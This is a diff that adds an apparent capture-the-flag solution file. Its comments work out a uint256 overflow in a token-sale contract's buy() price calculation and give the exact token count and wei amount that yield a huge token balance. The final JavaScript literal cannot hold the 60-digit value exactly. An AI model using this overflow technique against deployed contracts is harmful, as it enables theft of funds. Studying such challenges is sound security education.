@@ -1,0 +1,15 @@
+// uint256 at its maximum is 2**256–1, which is:
+// 115792089237316195423570985008687907853269984665640564039457584007913129639935
+
+// We are multiplying this with 10**18, so let’s take out the last 18 digits, giving us:
+// 115792089237316195423570985008687907853269984665640564039457
+
+// Add 1, and when we multiple this with 10**18 we will have:
+// 115792089237316195423570985008687907853269984665640564039458000000000000000000
+
+// Which would overflow to 415992086870360064, slightly below half an ether.
+
+//Now we know the number, we just need to call buy() with 115792089237316195423570985008687907853269984665640564039458 as the parameter,
+// while sending 415992086870360064 wei along with our transaction, which will overflow and give us a huge amount of tokens
+
+var solution = 115792089237316195423570985008687907853269984665640564039458;
